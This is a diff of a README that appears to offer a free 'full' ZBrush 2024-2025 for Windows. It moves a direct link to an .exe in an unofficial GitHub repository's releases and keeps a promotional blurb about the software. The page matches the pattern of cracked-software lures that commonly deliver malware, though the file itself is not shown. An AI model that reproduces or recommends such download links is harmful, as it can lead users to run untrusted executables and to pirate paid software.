@@ -6,8 +6,8 @@
 
 
 | Downloads | For Windows | 
-|:-------------:| :-----:| :--------:|
-| | [Download for Windows](https://github.com/arsham129/Zbrush-Full-2024-2025/releases/download/2/ZBrush-Full-2024-2025.exe) | 
+
+[Download for Windows](https://github.com/arsham129/Zbrush-Full-2024-2025/releases/download/2/ZBrush-Full-2024-2025.exe) 
 
 
 ### ZBrush is a professional digital sculpting software designed for 3D artists. Whether you're a beginner or an experienced modeler, ZBrush offers a suite of powerful tools that enable you to create detailed and high-quality 3D models.
